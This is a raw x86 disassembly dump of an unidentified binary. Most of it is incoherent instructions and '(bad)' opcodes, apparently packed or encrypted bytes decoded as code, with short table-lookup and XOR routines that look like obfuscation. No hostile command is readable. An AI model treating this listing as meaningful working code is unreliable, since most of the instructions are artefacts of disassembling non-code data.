  404fa1:	mov    eax,ds:0xfd200fe7
  404fa6:	das    
  404fa7:	arpl   WORD PTR [edx+0x1892b098],bp
  404fad:	(bad)  
  404fae:	outs   dx,BYTE PTR ds:[esi]
  404faf:	ja     0x404f67
  404fb1:	mov    al,0x41
  404fb3:	and    DWORD PTR [ecx-0xa],edi
  404fb6:	inc    eax
  404fb7:	out    0x8c,eax
  404fb9:	repnz out dx,eax
  404fbb:	cmp    eax,0xb9d2b57
  404fc0:	xor    ebp,edi
  404fc2:	cmp    edi,edx
  404fc4:	scas   eax,DWORD PTR es:[edi]
  404fc5:	pop    ebp
  404fc6:	(bad)  
  404fc8:	xlat   BYTE PTR ds:[ebx]
  404fc9:	push   edi
  404fca:	shl    DWORD PTR [esi+edi*2-0x2b],1
  404fce:	outs   dx,BYTE PTR ds:[esi]
  404fcf:	test   BYTE PTR [esi-0x65a2cebc],bh
  404fd5:	mov    ch,0x48
  404fd7:	fwait
  404fd8:	int3   
  404fd9:	ds jnp 0x404f7d
  404fdc:	or     BYTE PTR [ebx],0x99
  404fdf:	xchg   esi,eax
  404fe0:	push   edi
  404fe1:	not    BYTE PTR [esi]
  404fe3:	je     0x404fd5
  404fe5:	test   DWORD PTR [ebx+ebx*8+0x50],esp
  404fe9:	leave  
  404fea:	sar    DWORD PTR [eax],cl
  404fec:	bound  esp,QWORD PTR [ecx+0x2d]
  404fef:	fstp   DWORD PTR [eax+ebp*2]
  404ff2:	or     al,0x17
  404ff4:	sbb    DWORD PTR [eax],eax
  404ff6:	mov    BYTE PTR [ebp-0x5],al
  404ff9:	add    eax,DWORD PTR [ebp-0x6c]
  404ffc:	mov    dh,0xa8
  404ffe:	ret    0x49c1
  405001:	or     BYTE PTR [ebp+esi*4-0x6e],ch
  405005:	repnz adc BYTE PTR [esi-0x7bace1a8],dh
  40500c:	inc    esi
  40500d:	aad    0x54
  40500f:	push   0xffffffb0
  405011:	jg     0x405012
  405013:	ins    BYTE PTR es:[edi],dx
  405014:	pop    es
  405015:	das    
  405016:	(bad)  [edx-0xb]
  405019:	dec    eax
  40501a:	inc    esp
  40501b:	sub    esi,DWORD PTR [esi-0x1f]
  40501e:	shr    BYTE PTR [ebx-0x6f1eac14],0x8f
  405025:	cs lahf 
  405027:	fbld   TBYTE PTR [edx+0x4eb6b23d]
  40502d:	fsub   st(0),st
  40502f:	add    al,0x65
  405031:	sub    DWORD PTR [eax],0xffffffdb
  405034:	jno    0x40502a
  405036:	or     edx,DWORD PTR [ebx]
  405038:	dec    ecx
  405039:	cmp    BYTE PTR [eax],ch
  40503b:	cmp    ecx,ecx
  40503d:	(bad)  
  40503e:	dec    edi
  40503f:	int    0x95
  405041:	jmp    0x2e75:0xebaaf325
  405048:	and    BYTE PTR [edx-0x25],ah
  40504b:	xor    esi,DWORD PTR [edx+0x70]
  40504e:	mov    dl,0xcb
  405050:	dec    ebp
  405051:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405052:	pop    ss
  405053:	mov    ds:0xdc3eb7ce,al
  405058:	ret    0x7b74
  40505b:	pop    eax
  40505c:	pop    es
  40505d:	arpl   WORD PTR [ebx],di
  40505f:	jmp    0x8b8930f8
  405064:	and    al,0x42
  405066:	mov    al,ds:0x5d759b86
  40506b:	(bad)  
  40506c:	call   0x20e34e41
  405071:	mov    cl,0xa7
  405073:	jmp    DWORD PTR [edi-0x4b]
  405076:	inc    DWORD PTR [ecx+0x19266dc5]
  40507c:	cmp    DWORD PTR [edi],eax
  40507e:	daa    
  40507f:	jns    0x4050e2
  405081:	dec    ebp
  405082:	inc    ecx
  405083:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405085:	mov    dh,0xcf
  405087:	shl    BYTE PTR [edx+ecx*4],0xe4
  40508b:	mov    ch,0x4e
  40508d:	push   ebx
  40508e:	or     BYTE PTR [ebp-0x63],cl
  405091:	jb     0x40502a
  405093:	xchg   ebx,eax
  405094:	mov    dl,0x81
  405096:	vmovlhps xmm1,xmm3,xmm3
  40509a:	popa   
  40509b:	add    BYTE PTR [edx-0x7a],dl
  40509e:	test   BYTE PTR [edi+0x629df27e],al
  4050a4:	mov    al,0x9c
  4050a6:	jo     0x405055
  4050a8:	xchg   esi,eax
  4050a9:	jbe    0x4050a3
  4050ab:	shl    DWORD PTR [ebx],1
  4050ad:	cmp    DWORD PTR fs:[edi-0x32c58d4b],edx
  4050b4:	invd   
  4050b6:	pop    ss
  4050b7:	inc    eax
  4050b8:	(bad)  
  4050b9:	std    
  4050ba:	pop    edx
  4050bb:	addr16 popa 
  4050bd:	rcl    BYTE PTR [ebx-0x45],1
  4050c0:	add    bh,bh
  4050c2:	test   eax,0x944f84c4
  4050c7:	mov    edi,0xffcd8d68
  4050cc:	sub    edi,eax
  4050ce:	add    edi,DWORD PTR [ebp+0x10]
  4050d1:	xor    edx,ecx
  4050d3:	add    edx,esi
  4050d5:	cmp    edx,edi
  4050d7:	ja     0x4059fd
  4050dd:	push   ebx
  4050de:	jmp    0x4053d8
  4050e3:	mov    esi,0x327298
  4050e8:	jmp    0x4053d8
  4050ed:	aas    
  4050ee:	rol    dh,1
  4050f0:	int3   
  4050f1:	aad    0xd2
  4050f3:	(bad)  
  4050f5:	dec    esp
  4050f6:	sub    BYTE PTR [ebx+0x2dc3e5fe],bh
  4050fc:	psubsb mm6,QWORD PTR [eax]
  4050ff:	js     0x405179
  405101:	dec    ebp
  405102:	jle    0x40517c
  405104:	js     0x4050dd
  405106:	mov    ds:0x990659d8,eax
  40510b:	cs out 0xe9,al
  40510e:	mov    dh,0x34
  405110:	pop    edx
  405111:	dec    edx
  405112:	push   0x3dd77da6
  405117:	(bad)  
  405118:	jmp    0x6952:0xda281799
  40511f:	cld    
  405120:	and    BYTE PTR [ebp*4+0x2af32232],dl
  405127:	push   es
  405128:	vpaddq ymm4,ymm3,YMMWORD PTR ds:[ecx]
  40512d:	fdivr  DWORD PTR [ecx-0x4d]
  405130:	popa   
  405131:	retf   
  405132:	test   eax,0xa124dd60
  405137:	aas    
  405138:	dec    eax
  405139:	(bad)  
  40513a:	pop    ebp
  40513b:	cmp    eax,0xb001738a
  405140:	xchg   edx,eax
  405141:	sub    ah,ah
  405143:	idiv   DWORD PTR [eax+0x4c174267]
  405149:	pop    edx
  40514a:	xor    DWORD PTR [ebp-0xd1f8d1a],0xf3662af1
  405154:	bound  edi,QWORD PTR [esi+0x2c]
  405157:	mov    bl,al
  405159:	xor    eax,0xa9df80c9
  40515e:	mov    ds:0x183740fd,al
  405163:	sub    BYTE PTR [ebx-0x5e75b327],dh
  405169:	pop    esp
  40516a:	jno    0x405139
  40516c:	pop    esp
  40516d:	cmp    eax,0x6d587566
  405172:	cdq    
  405173:	xor    DWORD PTR [ebx+0x17],ecx
  405176:	pop    ebp
  405177:	ror    esi,1
  405179:	inc    ebp
  40517a:	fnstsw WORD PTR [esi-0x75]
  40517d:	addr16 xchg esi,eax
  40517f:	call   0xb8f85de1
  405184:	mov    ?,WORD PTR [ebx+ecx*8+0xe]
  405188:	cmp    DWORD PTR [esi-0x1cc80852],ebp
  40518e:	lds    ebp,FWORD PTR [esi]
  405190:	je     0x405144
  405192:	push   0x5507ce95
  405197:	clc    
  405198:	div    ch
  40519a:	adc    al,0x13
  40519c:	xchg   edi,eax
  40519d:	sub    esi,DWORD PTR [eax-0x2]
  4051a0:	jp     0x4051fe
  4051a2:	inc    edx
  4051a3:	imul   ebx,DWORD PTR [ebp-0x2c],0xffffff83
  4051a7:	cmp    bh,BYTE PTR [ebx]
  4051a9:	lock pop ss
  4051ab:	loopne 0x40512f
  4051ad:	mov    al,ds:0x5893c06a
  4051b2:	mov    edi,0x69fad86b
  4051b7:	shl    DWORD PTR [esi],cl
  4051b9:	or     DWORD PTR [ebp-0x49],0xffffffff
  4051bd:	popa   
  4051be:	test   cl,0x93
  4051c1:	jns    0x4051f1
  4051c3:	aas    
  4051c4:	fwait
  4051c5:	sub    BYTE PTR ds:0xa9aeb164,ah
  4051cb:	mov    dl,0xff
  4051cd:	js     0x40518f
  4051cf:	in     al,dx
  4051d0:	fdivr  st,st(3)
  4051d2:	inc    ebx
  4051d3:	retf   
  4051d4:	mov    ch,0x57
  4051d6:	outs   dx,BYTE PTR ds:[esi]
  4051d7:	lods   al,BYTE PTR ds:[esi]
  4051d8:	aas    
  4051d9:	push   0xa1e3d91e
  4051de:	pop    ds
  4051df:	or     eax,0x626d90fc
  4051e4:	ret    0x27fb
  4051e7:	fcomp  st(2)
  4051e9:	dec    eax
  4051ea:	lods   al,BYTE PTR ds:[esi]
  4051eb:	jnp    0x4051ce
  4051ed:	cmp    eax,0x10f608e8
  4051f2:	stos   DWORD PTR es:[edi],eax
  4051f3:	ins    BYTE PTR es:[edi],dx
  4051f4:	and    DWORD PTR [edx+ebp*4-0x6e],esp
  4051f8:	pusha  
  4051f9:	inc    esp
  4051fa:	test   DWORD PTR [esp+ecx*2],0x6be09345
  405201:	mov    ebx,0xbbb2837e
  405206:	test   al,0xbb
  405208:	adc    DWORD PTR [eax-0x4a],ecx
  40520b:	push   esi
  40520c:	and    DWORD PTR [ebx+0x38],ebp
  40520f:	sbb    eax,0x7c8e0a8d
  405214:	inc    edi
  405215:	and    eax,0x7189017b
  40521a:	adc    BYTE PTR [eax-0x9],al
  40521d:	push   ebp
  40521e:	dec    edi
  40521f:	inc    edx
  405220:	icebp  
  405221:	fwait
  405222:	pop    ds
  405223:	mov    DWORD PTR [eax-0x6f8981a5],esi
  405229:	pop    ds
  40522a:	pop    esp
  40522b:	faddp  st(6),st
  40522d:	mov    ds:0x6f1ab3df,eax
  405232:	paddusb mm2,mm3
  405235:	pop    ss
  405236:	jae    0x405263
  405238:	and    eax,0xa5ca74f1
  40523d:	data16 loope 0x405240
  405240:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405241:	iret   
  405242:	imul   ebp,DWORD PTR [ebx],0x5db124dc
  405248:	xchg   ecx,eax
  405249:	jnp    0x4051e0
  40524b:	push   esp
  40524c:	pop    ss
  40524d:	outs   dx,DWORD PTR ds:[esi]
  40524e:	retf   
  40524f:	fistp  DWORD PTR [esi-0xd]
  405252:	fiadd  WORD PTR [ebp-0x5b8f3b92]
  405258:	cmp    al,BYTE PTR [ecx]
  40525a:	xchg   ebp,eax
  40525b:	sbb    al,0x31
  40525d:	dec    edi
  40525e:	sub    eax,0xbc68ca85
  405263:	jne    0x4051f7
  405265:	xor    BYTE PTR [esi+ecx*8+0x7a2ec9d4],dl
  40526c:	or     cl,BYTE PTR [ebp+0x29]
  40526f:	in     al,dx
  405270:	clc    
  405271:	imul   eax,ecx,0x12059829
  405277:	push   cs
  405278:	and    al,0x2b
  40527a:	pop    esp
  40527b:	pushf  
  40527c:	dec    ebp
  40527d:	inc    edx
  40527e:	mov    dl,0x2a
  405280:	jmp    0x405268
  405282:	je     0x40520a
  405284:	xchg   esp,eax
  405285:	(bad)  
  405286:	mov    ch,BYTE PTR [ebx+0x5ac6cc37]
  40528c:	in     eax,dx
  40528d:	jno    0x40527f
  40528f:	xor    eax,0x649b0b8a
  405294:	jnp    0x4052fb
  405296:	sub    ch,BYTE PTR [edi]
  405298:	pop    es
  405299:	add    ecx,DWORD PTR [ebp-0x3e]
  40529c:	xor    edx,edi
  40529e:	jge    0x40526d
  4052a0:	xlat   BYTE PTR ds:[ebx]
  4052a1:	out    dx,eax
  4052a2:	retf   0x2805
  4052a5:	xor    edi,esi
  4052a7:	cmp    eax,0xf387d71
  4052ac:	sbb    eax,0x3581cece
  4052b1:	fadd   QWORD PTR [esi+ebp*8-0x1e2f8384]
  4052b8:	call   0x4e7e0f14
  4052bd:	pushf  
  4052be:	inc    esi
  4052bf:	call   0x3516:0xc9821ab3
  4052c6:	jns    0x4052b2
  4052c8:	xlat   BYTE PTR ds:[ebx]
  4052c9:	jnp    0x40532d
  4052cb:	add    eax,0xbdd06f67
  4052d0:	adc    DWORD PTR [edi-0x5eb5f6d9],esp
  4052d6:	adc    DWORD PTR [edi],ebp
  4052d8:	mul    DWORD PTR [ebx]
  4052da:	sbb    al,0x1d
  4052dc:	pushf  
  4052dd:	out    0x63,al
  4052df:	in     al,0xfa
  4052e1:	sahf   
  4052e2:	fistp  WORD PTR ds:0xc2cce9b8
  4052e8:	test   BYTE PTR [esi-0x7d7f3665],bl
  4052ee:	jp     0x40531b
  4052f0:	lea    esp,[ebp+0x32ca6f1b]
  4052f6:	stos   DWORD PTR es:[edi],eax
  4052f7:	inc    BYTE PTR [eax-0x6a06709e]
  4052fd:	and    cl,bh
  4052ff:	pusha  
  405300:	pop    edx
  405301:	xor    al,0x6c
  405303:	add    eax,0xd62f936e
  405308:	cmp    edx,DWORD PTR [ecx]
  40530a:	mov    esp,0x2741bc66
  40530f:	(bad)  ds:0x3026eafa
  405315:	rcl    BYTE PTR [eax+eax*4-0xe06d12f],0x88
  40531d:	jmp    0x405311
  40531f:	iret   
  405320:	ins    BYTE PTR es:[edi],dx
  405321:	loopne 0x405305
  405323:	xchg   ebx,eax
  405324:	jae    0x4052ce
  405326:	push   cs
  405327:	xchg   edx,eax
  405328:	pop    DWORD PTR [ebx]
  40532a:	push   esp
  40532b:	mov    ebp,0xfa8b21d5
  405330:	fst    QWORD PTR [edi]
  405332:	pop    ebx
  405333:	scas   eax,DWORD PTR es:[edi]
  405334:	xor    BYTE PTR [esi-0xbeb1f53],bl
  40533a:	into   
  40533b:	mov    edi,es
  40533d:	cmp    eax,0x1705fb9c
  405342:	retf   
  405343:	sbb    ecx,eax
  405345:	stos   BYTE PTR es:[edi],al
  405346:	fs ins DWORD PTR es:[edi],dx
  405348:	add    eax,0x9b0ebe57
  40534d:	jge    0x405319
  40534f:	popf   
  405350:	out    0xee,eax
  405352:	clc    
  405353:	arpl   WORD PTR [ebx+ebx*8+0x7d0a1b06],di
  40535a:	jno    0x40530c
  40535c:	pop    ecx
  40535d:	or     al,0x2f
  40535f:	loopne 0x4053c4
  405361:	leave  
  405362:	adc    ah,BYTE PTR [esi]
  405364:	sub    esi,DWORD PTR ss:[ebx-0x7c16d82d]
  40536b:	add    edx,DWORD PTR [ebx-0x15e89f0]
  405371:	jmp    0x1ddb:0xf02f470a
  405378:	push   cs
  405379:	pop    ecx
  40537a:	mov    esi,0x50241265
  40537f:	or     al,0xab
  405381:	push   ebx
  405382:	mov    BYTE PTR [ebp+0x41518c6d],0x5e
  405389:	sar    DWORD PTR gs:[eax-0x58],0xe6
  40538e:	xchg   esi,eax
  40538f:	test   eax,0x9b11ba82
  405394:	mov    cl,0xa8
  405396:	pop    bp
  405398:	test   al,0xb8
  40539a:	fs mov dl,ch
  40539d:	adc    ah,BYTE PTR [edx+eax*1+0x11]
  4053a1:	ins    BYTE PTR es:[edi],dx
  4053a2:	jl     0x4053df
  4053a4:	xlat   BYTE PTR ds:[ebx]
  4053a5:	pop    ecx
  4053a6:	dec    esp
  4053a7:	cdq    
  4053a8:	push   eax
  4053a9:	mov    ds,WORD PTR [eax-0x15]
  4053ac:	xchg   ebx,eax
  4053ad:	popa   
  4053ae:	retf   0x78b
  4053b1:	jmp    0x405414
  4053b3:	loopne 0x4053d2
  4053b5:	xor    bl,bh
  4053b7:	outs   dx,DWORD PTR ds:[esi]
  4053b8:	sub    eax,0xff593131
  4053bd:	call   DWORD PTR [ebx]
  4053bf:	ret    0x3304
  4053c2:	in     al,0x14
  4053c4:	not    BYTE PTR es:[ecx]
  4053c7:	sub    eax,0x2a17b0da
  4053cc:	sub    dl,BYTE PTR [edx+eax*2+0x57]
  4053d0:	out    0xfc,al
  4053d2:	push   ss
  4053d3:	mov    ecx,DWORD PTR [ebx-0x7415e59e]
  4053d9:	inc    ebp
  4053da:	clc    
  4053db:	jmp    0x4056cb
  4053e0:	int    0xd3
  4053e2:	rol    ah,cl
  4053e4:	ror    cl,cl
  4053e6:	aad    0xd9
  4053e8:	inc    edx
  4053e9:	jecxz  0x40544a
  4053eb:	fsubr  QWORD PTR [eax]
  4053ed:	mov    dl,0xfc
  4053ef:	push   eax
  4053f0:	cmp    eax,0x4d787835
  4053f5:	jle    0x40546f
  4053f7:	js     0x40537a
  4053f9:	mov    bh,0xfc
  4053fb:	sbb    al,BYTE PTR [ecx-0x27]
  4053fe:	jge    0x405460
  405400:	stc    
  405401:	or     BYTE PTR [ebp-0x51e0efa8],bl
  405407:	sar    BYTE PTR [eax-0x56428d6],cl
  40540d:	cmc    
  40540e:	ret    
  40540f:	jne    0x405410
  405411:	push   edi
  405412:	call   0x1f16c2f9
  405417:	aas    
  405418:	fld    QWORD PTR [esi+0x2971b0eb]
  40541e:	loop   0x405405
  405420:	call   0xb12efc3f
  405425:	sar    DWORD PTR [esi-0x21],0x46
  405429:	pop    ebx
  40542a:	stc    
  40542b:	sub    ebx,0x2d349637
  405431:	xor    esp,eax
  405433:	rcl    edi,cl
  405435:	scas   eax,DWORD PTR es:[edi]
  405436:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405437:	sahf   
  405438:	mov    eax,ds:0xe62a3b19
  40543d:	cmc    
  40543e:	pop    edx
  40543f:	hlt    
  405440:	fisubr WORD PTR [eax-0x55]
  405443:	cmp    al,0x9
  405445:	or     DWORD PTR [eax+0x17],ecx
  405448:	mov    esp,0xb03d3d36
  40544d:	add    ch,BYTE PTR es:[edx+0x43]
  405451:	push   ebp
  405452:	ret    
  405453:	push   ebp
  405454:	dec    ecx
  405455:	sbb    al,0xa
  405457:	dec    edx
  405458:	or     BYTE PTR [eax+0x33acd04e],ah
  40545e:	add    al,bh
  405460:	pop    eax
  405461:	adc    cl,BYTE PTR [edx]
  405463:	cmc    
  405464:	cli    
  405465:	idiv   BYTE PTR [ebp-0x42]
  405468:	xchg   edx,eax
  405469:	jno    0x405451
  40546b:	and    al,0x6c
  40546d:	jge    0x405458
  40546f:	push   ebx
  405470:	cs mov cl,0x8
  405473:	push   es
  405474:	sbb    eax,0x11a0949d
  405479:	cmovs  eax,DWORD PTR [esp+eiz*4-0x4]
  40547e:	(bad)  
  40547f:	aad    0x57
  405481:	push   eax
  405482:	push   ebx
  405483:	hlt    
  405484:	mov    esp,0xce488aaa
  405489:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40548b:	sbb    BYTE PTR [edx+0x543f972f],dh
  405491:	fwait
  405492:	adc    al,0x7
  405494:	ins    BYTE PTR es:[edi],dx
  405495:	fwait
  405496:	call   0xcd70:0xbfeebf02
  40549d:	mov    ebp,0x7c70bb87
  4054a2:	mov    dh,BYTE PTR ds:0xb7f0dae2
  4054a8:	(bad)  
  4054a9:	xchg   esp,eax
  4054aa:	enter  0x3ba0,0x2d
  4054ae:	and    edi,DWORD PTR ds:0x8567c731
  4054b4:	enter  0x7c38,0xf1
  4054b8:	push   0xd4cac3f
  4054bd:	jmp    0x405482
  4054bf:	mov    eax,0xc6f3a972
  4054c4:	cli    
  4054c5:	jbe    0x40550f
  4054c7:	inc    ebp
  4054c8:	push   eax
  4054c9:	out    0xf2,al
  4054cb:	xchg   edi,eax
  4054cc:	es push esi
  4054ce:	and    DWORD PTR [eax-0x76],esi
  4054d1:	inc    edi
  4054d2:	out    0x37,eax
  4054d4:	cmp    esp,edx
  4054d6:	jb     0x40552a
  4054d8:	add    al,0xd7
  4054da:	ret    
  4054db:	call   0x1b46:0x6c29c331
  4054e2:	pushf  
  4054e3:	inc    ecx
  4054e4:	adc    BYTE PTR [edi-0x4336af74],dh
  4054ea:	sub    ebx,esi
  4054ec:	imul   esp,DWORD PTR [ecx],0xbcef29bf
  4054f2:	dec    ecx
  4054f3:	push   ecx
  4054f4:	sbb    BYTE PTR [ebp+0x5b],dl
  4054f7:	cmp    al,0x5b
  4054f9:	fcom   DWORD PTR [esi-0x7eec5cd6]
  4054ff:	pop    ecx
  405500:	arpl   WORD PTR [ebx],bp
  405502:	mov    al,ds:0x12790cee
  405507:	mov    esp,0x66bf8281
  40550c:	(bad)  
  40550e:	icebp  
  40550f:	sbb    bl,BYTE PTR [esi-0x1c]
  405512:	std    
  405513:	dec    esp
  405514:	pop    ss
  405515:	test   bh,al
  405517:	cmp    al,0x84
  405519:	inc    edi
  40551a:	mov    edx,0x873c6c5c
  40551f:	jbe    0x405597
  405521:	mov    al,ds:0x1a476327
  405526:	or     cl,BYTE PTR [edx]
  405528:	cmp    al,0x4c
  40552a:	push   eax
  40552b:	ss int 0x38
  40552e:	out    dx,eax
  40552f:	and    BYTE PTR [ecx],cl
  405531:	jmp    0x40550f
  405533:	adc    ecx,DWORD PTR [ecx]
  405535:	jne    0x4054ca
  405537:	mov    dh,0x22
  405539:	mov    ebx,0x9abda390
  40553e:	int    0x9c
  405540:	shr    BYTE PTR [ecx-0x47c88a51],0x58
  405547:	fldenv [edi]
  405549:	mov    ecx,0x9fa70019
  40554e:	mov    bl,0xaf
  405550:	inc    ecx
  405551:	cmp    DWORD PTR [edx-0x469ead73],esp
  405557:	loope  0x405529
  405559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40555a:	pushf  
  40555b:	or     ch,BYTE PTR gs:[ebp+ebx*2+0x22]
  405560:	push   edx
  405561:	aaa    
  405562:	adc    BYTE PTR [ebp+0x4d],dl
  405565:	pop    ebp
  405566:	dec    edi
  405567:	ins    DWORD PTR es:[edi],dx
  405568:	inc    esi
  405569:	stos   DWORD PTR es:[edi],eax
  40556a:	sbb    dh,BYTE PTR [edx+0x237f02ef]
  405570:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405571:	lock adc eax,0x7ee09aaa
  405577:	(bad)  
  405578:	std    
  405579:	ja     0x40552c
  40557b:	fisub  DWORD PTR ss:[edx-0x32]
  40557f:	loopne 0x4055ae
  405581:	jge    0x405530
  405583:	jmp    0xeec1f2f9
  405588:	sbb    eax,0x3e3edb8f
  40558d:	cmp    bh,BYTE PTR ds:0x506adce
  405593:	xchg   edx,eax
  405594:	sbb    BYTE PTR cs:[esi],dl
  405597:	push   0xa8d64481
  40559c:	inc    esp
  40559d:	stos   DWORD PTR es:[edi],eax
  40559e:	cmp    DWORD PTR [ecx],0x8d0025de
  4055a4:	adc    eax,0x7fa47d83
  4055a9:	xlat   BYTE PTR ds:[ebx]
  4055aa:	scas   eax,DWORD PTR es:[edi]
  4055ab:	mov    fs,WORD PTR [edx+0x7a405c41]
  4055b1:	retf   
  4055b2:	push   esp
  4055b3:	xor    BYTE PTR fs:[ebx-0xf],0x78
  4055b8:	xchg   BYTE PTR [esi+ecx*8+0x1a],bl
  4055bc:	imul   eax,DWORD PTR [eax],0x4a0b4c34
  4055c2:	xchg   edx,eax
  4055c3:	mov    WORD PTR [esi-0x3903af5b],?
  4055c9:	pop    ds
  4055ca:	mov    esp,0x57542424
  4055cf:	fs scas al,BYTE PTR es:[edi]
  4055d1:	add    BYTE PTR [eax+esi*8-0x6667b964],ah
  4055d8:	sbb    al,0x7f
  4055da:	push   eax
  4055db:	fs scas eax,DWORD PTR es:[edi]
  4055dd:	add    DWORD PTR [edx-0x297a1c2f],ebp
  4055e3:	iret   
  4055e4:	ss call 0x726e2b5
  4055ea:	and    edx,DWORD PTR [ecx-0x35]
  4055ed:	cmp    esi,edi
  4055ef:	sbb    eax,0xfe581fa0
  4055f4:	loop   0x40562f
  4055f6:	sub    al,0xb6
  4055f8:	sub    ebp,DWORD PTR [esi-0x4c]
  4055fb:	mov    bh,bh
  4055fd:	jecxz  0x40561c
  4055ff:	rcl    BYTE PTR [ebx+0x78b473a7],cl
  405605:	xchg   BYTE PTR [ebx-0x149fcf31],al
  40560b:	jne    0x4055a4
  40560d:	test   edi,edi
  40560f:	xor    eax,0xb56c74bc
  405614:	xchg   ebx,eax
  405615:	mov    edx,0x8621b724
  40561a:	push   0x86c4dfe9
  40561f:	push   esp
  405620:	and    al,0x16
  405622:	sbb    DWORD PTR [ebx],edx
  405624:	ins    DWORD PTR es:[edi],dx
  405625:	dec    esi
  405626:	mov    al,ds:0x514345ce
  40562b:	inc    esp
  40562c:	lods   eax,DWORD PTR ds:[esi]
  40562d:	(bad)  
  40562f:	fwait
  405630:	mov    WORD PTR ds:0xf0d7d7f5,fs
  405636:	cmp    DWORD PTR [ebx+0x76ff6ec4],0x5e0acd77
  405640:	out    dx,eax
  405641:	mov    ebp,0x6dc9b79d
  405646:	or     eax,0x4d81f76
  40564b:	mov    cl,0x35
  40564d:	pop    ecx
  40564e:	std    
  40564f:	repnz xchg edx,eax
  405651:	mov    ecx,0x13d25193
  405656:	lods   eax,DWORD PTR ds:[esi]
  405657:	shr    BYTE PTR gs:[ebx],1
  40565a:	mov    dl,0xcc
  40565c:	adc    dl,cl
  40565e:	les    eax,FWORD PTR [eax+0x9]
  405661:	pop    ss
  405662:	je     0x405669
  405664:	popf   
  405665:	pop    ss
  405666:	mov    edi,edi
  405668:	push   ds
  405669:	(bad)  
  40566a:	mov    esi,0xb8c8fc0d
  40566f:	jle    0x4056a8
  405671:	inc    ebx
  405672:	or     BYTE PTR [ecx+ebp*4-0x25],cl
  405676:	ret    0x4d5c
  405679:	adc    DWORD PTR [edx],ebx
  40567b:	inc    esi
  40567c:	cmp    eax,0x3cacff1a
  405681:	jmp    0x405697
  405683:	and    DWORD PTR ss:[esi-0x9],esi
  405687:	stos   DWORD PTR es:[edi],eax
  405688:	jle    0x40569c
  40568a:	mov    ch,0x82
  40568c:	(bad)  
  40568d:	lahf   
  40568e:	js     0x4056fe
  405690:	imul   eax,DWORD PTR [ebx+0x455df359],0xba07f1ef
  40569a:	and    ch,cl
  40569c:	dec    edi
  40569d:	imul   edi,esi,0x21
  4056a0:	lds    esi,FWORD PTR [ecx-0x61]
  4056a3:	sub    bh,dl
  4056a5:	call   0x18:0xbd99cec5
  4056ac:	inc    eax
  4056ad:	ins    DWORD PTR es:[edi],dx
  4056ae:	gs dec edx
  4056b0:	and    DWORD PTR [esi-0x14],esi
  4056b3:	lods   eax,DWORD PTR ds:[esi]
  4056b4:	popf   
  4056b5:	shl    BYTE PTR [esi],cl
  4056b7:	adc    al,0x39
  4056b9:	cld    
  4056ba:	and    al,0xce
  4056bc:	ror    BYTE PTR [esi-0x1a],cl
  4056bf:	sti    
  4056c0:	leave  
  4056c1:	inc    eax
  4056c2:	inc    esi
  4056c3:	add    bl,dl
  4056c5:	test   al,0x3b
  4056c7:	test   al,0x3b
  4056c9:	retf   0x8bd4
  4056cc:	jge    0x4056ca
  4056ce:	xor    edi,ecx
  4056d0:	add    edi,esi
  4056d2:	mov    esi,DWORD PTR [ebp+0x8]
  4056d5:	imul   edi,edx
  4056d8:	mov    ebx,DWORD PTR [ebp+0xc]
  4056db:	xor    eax,ecx
  4056dd:	add    eax,edx
  4056df:	mov    al,BYTE PTR [ebx+eax*1+0x327298]
  4056e6:	mov    BYTE PTR [edi+esi*1],al
  4056e9:	mov    eax,DWORD PTR [ebp-0x4]
  4056ec:	xor    eax,ecx
  4056ee:	lea    edx,[edx+eax*1+0x327298]
  4056f5:	mov    eax,DWORD PTR [ebp-0x4]
  4056f8:	xor    eax,ecx
  4056fa:	mov    esi,0xffcd8d68
  4056ff:	sub    esi,eax
  405701:	jmp    0x4059f1
  405706:	rol    esi,cl
  405708:	retf   0xd9c2
  40570b:	ret    0xd5db
  40570e:	shr    DWORD PTR [edx],0xd2
  405711:	ins    BYTE PTR es:[edi],dx
  405712:	pusha  
  405713:	jmp    0x40576c
  405715:	fst    DWORD PTR [edx]
  405717:	cmp    bh,BYTE PTR [eax+0x78]
  40571a:	dec    ebp
  40571b:	jle    0x405795
  40571d:	js     0x4056e8
  40571f:	or     al,BYTE PTR [eax-0x7a]
  405722:	and    DWORD PTR [ecx-0x6b],ecx
  405725:	mov    al,0xdc
  405727:	cwde   
  405728:	inc    ecx
  405729:	mov    al,0x6e
  40572b:	lahf   
  40572c:	in     al,0x26
  40572e:	dec    eax
  40572f:	add    al,0x45
  405731:	out    0x55,al
  405733:	cmp    al,0x69
  405735:	pop    si
  405737:	jno    0x40577e
  405739:	pop    ecx
  40573a:	push   esp
  40573b:	adc    esi,ebx
  40573d:	xor    al,0xb0
  40573f:	dec    eax
  405740:	push   edi
  405741:	es mov dl,0x3c
  405744:	mov    DWORD PTR [edx+ebx*8-0x13],esi
  405748:	sub    dh,bl
  40574a:	call   0x252a3a9e
  40574f:	bound  eax,QWORD PTR [edi+0x1c50214]
  405755:	(bad)  
  405757:	fwait
  405758:	adc    al,0x60
  40575a:	and    dl,BYTE PTR [esi]
  40575c:	call   0x71c3a521
  405761:	loopne 0x405708
  405763:	(bad)
  405767:	cwde   
  405768:	cld    
  405769:	add    al,0xd
  40576b:	dec    ebx
  40576c:	(bad)  
  40576d:	aas    
  40576e:	xor    eax,0x986148e9
  405773:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405775:	int3   
  405776:	jbe    0x405780
  405778:	ins    BYTE PTR es:[edi],dx
  405779:	data16 out dx,al
  40577b:	jecxz  0x40576a
  40577d:	cmp    ebp,ebp
  40577f:	xchg   ebx,eax
  405780:	cmp    ebp,DWORD PTR [edi+0x28]
  405783:	dec    eax
  405784:	fisttp WORD PTR [edi-0x23]
  405787:	(bad)  
  405788:	test   DWORD PTR [edx+0x60],esi
  40578b:	iret   
  40578c:	ret    0x79a9
  40578f:	push   0xffffffed
  405791:	cmp    ch,ah
  405793:	scas   al,BYTE PTR es:[edi]
  405794:	mov    ebx,0x9329555a
  405799:	dec    eax
  40579a:	add    ch,al
  40579c:	dec    eax
  40579d:	ss push eax
  40579f:	xor    eax,DWORD PTR [ecx-0x2efe5aca]
  4057a5:	test   al,0x8c
  4057a7:	mov    ds:0xf85a94f5,eax
  4057ac:	ret    0xc128
  4057af:	adc    bh,0x4c
